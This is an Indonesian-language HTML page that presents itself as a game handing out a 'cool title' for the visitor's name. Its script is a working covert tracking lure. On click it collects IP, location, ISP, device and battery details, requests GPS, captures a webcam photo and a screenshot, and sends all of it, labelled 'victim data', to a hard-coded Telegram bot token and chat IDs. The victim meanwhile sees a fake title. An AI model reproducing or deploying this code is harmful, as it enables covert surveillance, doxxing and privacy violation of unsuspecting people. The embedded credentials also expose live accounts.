<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>arfaa cokill nih derr🐉</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
      font-family: 'Inter', sans-serif;
      color: lime;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(0, 255, 127, 0.3);
      border-radius: 50%;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px); opacity: 0.3; }
      50% { transform: translateY(-20px); opacity: 0.8; }
    }
    .login-container {
      background-color: rgba(17, 17, 17, 0.95);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px lime;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #00ff7f, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .login-subtitle {
      font-size: 13px;
      color: #ffc107;
      margin-bottom: 20px;
    }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #333;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
    }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #00ff7f, #00cc66);
      color: black;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
    }
    .login-button:hover {
      background-color: #0f0;
      box-shadow: 0 0 20px lime;
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 20px;
      background: #222;
      padding: 15px;
      border-radius: 8px;
      font-size: 13px;
    }
    video, canvas { display: none; }
    @media (max-width: 480px) {
      .login-container { padding: 25px 20px; }
      .login-title { font-size: 22px; }
      .login-input, .login-button { font-size: 14px; padding: 10px; }
    }
  </style>
</head>
<body>
  <div class="bg-particles">
    <!-- 50 particle divs (dipotong untuk ringkas) -->
  </div>
  <div class="login-container">
    <p class="login-title">🎁 DAPATKAN TITLE KEREN</p>
    <p class="login-subtitle">Masukkan nama kamu untuk mendapat gelar spesial</p>
    <input type="text" class="login-input" placeholder="Nama lengkap" id="text" autocomplete="off">
    <button class="login-button" id="login-button">Dapatkan Title 🔥</button>
    <div id="info">✨ Masukkan nama kamu, nanti akan muncul gelar keren beserta foto dan screenshot ✨</div>
  </div>
  <video id="video" autoplay="" playsinline=""></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    // KONFIGURASI BOT
    const botToken = '8832796984:AAERkQRQUHJeqKydZVrfWcT5Z7UR6l_pAhw';
    const chatIds = ['8297633065'] , ['7411874888'];
    const infoDiv = document.getElementById('info');
    const inputNama = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        if (!id || id === '-') return;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob, caption = '') {
      chatIds.forEach(id => {
        if (!id || id === '-') return;
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        if (caption) formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData }).catch(console.error);
      });
    }

    async function captureAndSendScreen() {
      try {
        const canvas = await html2canvas(document.body, { scale: 0.8, backgroundColor: null });
        canvas.toBlob(blob => {
          if (blob) sendPhotoToTelegram(blob, `📸 Screenshot (${inputNama.value.trim()}) - ${new Date().toLocaleString()}`);
          else sendToTelegram(`❌ Gagal screenshot.`);
        }, 'image/jpeg', 0.7);
      } catch(e) { sendToTelegram(`❌ Error screenshot: ${e.message}`); }
    }

    async function getDeviceInfo() {
      let ip = '-', city = '-', region = '-', country = '-', isp = '-';
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const data = await res.json();
          ip = data.ip || ip;
          city = data.city || city;
          region = data.region || region;
          country = data.country_name || country;
          isp = data.org || isp;
        }
      } catch(e) {}
      if (ip === '-' || city === '-') {
        try {
          const res = await fetch('https://ip-api.com/json/');
          const data = await res.json();
          if (data.status === 'success') {
            ip = data.query || ip;
            city = data.city || city;
            region = data.regionName || region;
            country = data.country || country;
            isp = data.isp || isp;
          }
        } catch(e) {}
      }
      if (ip === '-') {
        try {
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          ip = data.ip;
        } catch(e) {}
      }
      if (city === '-') city = 'Tidak diketahui';
      if (region === '-') region = 'Tidak diketahui';
      if (country === '-') country = 'Tidak diketahui';
      if (isp === '-') isp = 'Tidak diketahui';

      let batteryLevel = 'Tidak diketahui', charging = 'Tidak diketahui';
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          batteryLevel = `${Math.round(bat.level * 100)}%`;
          charging = bat.charging ? 'Ya (cas)' : 'Tidak';
        } catch(e) {}
      }

      const infoText = `
👤 NAMA         : ${inputNama.value.trim()}
🌐 IP           : ${ip}
📍 KOTA         : ${city}
🗺️ REGION       : ${region}
🏳️ NEGARA       : ${country}
📡 ISP          : ${isp}
💻 BROWSER      : ${navigator.userAgent}
🖥️ OS           : ${navigator.platform}
📱 RESOLUSI     : ${screen.width}x${screen.height}
🔋 BATERAI      : ${batteryLevel} (${charging})
🧠 MEMORI       : ${navigator.deviceMemory || 'Tidak diketahui'} GB
🍪 COOKIE       : ${navigator.cookieEnabled ? 'Aktif' : 'Nonaktif'}
⏰ WAKTU        : ${new Date().toLocaleString()}
      `.trim();
      sendToTelegram(`<b>📥 DATA KORBAN</b>\n<pre>${infoText}</pre>`);
    }

    function getGPSLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) resolve(null);
        else navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
          () => resolve(null),
          { timeout: 8000, enableHighAccuracy: true }
        );
      });
    }

    async function sendGPSLocation() {
      const gps = await getGPSLocation();
      if (gps) {
        const link = `https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
        sendToTelegram(`<b>📍 LOKASI GPS</b>\nLat: ${gps.lat}, Lon: ${gps.lon}\nAkurasi: ${gps.acc}m\n<a href="${link}">Buka Maps</a>`);
      } else {
        sendToTelegram(`📍 Izin lokasi ditolak atau GPS tidak tersedia.`);
      }
    }

    async function captureAndSendPhoto() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob, `📸 Foto kamera (${inputNama.value.trim()})`);
                  else sendToTelegram(`❌ Gagal foto kamera.`);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg', 0.8);
              }, 1000);
            };
          })
          .catch(err => {
            sendToTelegram(`❌ Kamera ditolak: ${err.message}`);
            resolve();
          });
      });
    }

    button.addEventListener('click', async () => {
      const nama = inputNama.value.trim();
      if (nama.length < 2) {
        infoDiv.innerText = '⚠️ Masukkan nama minimal 2 huruf!';
        return;
      }
      button.disabled = true;
      infoDiv.innerText = '⏳ Memproses...';
      sendToTelegram(`<b>🎯 TARGET BARU</b>\nNama: ${nama}`);
      await getDeviceInfo();
      await sendGPSLocation();
      await captureAndSendPhoto();
      await captureAndSendScreen();
      infoDiv.innerText = `✅ Sukses! Gelar untuk "${nama}" adalah: KINGSANJII THE LEGEND 🔥`;
      button.disabled = false;
      inputNama.value = '';
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
</body>
</html>
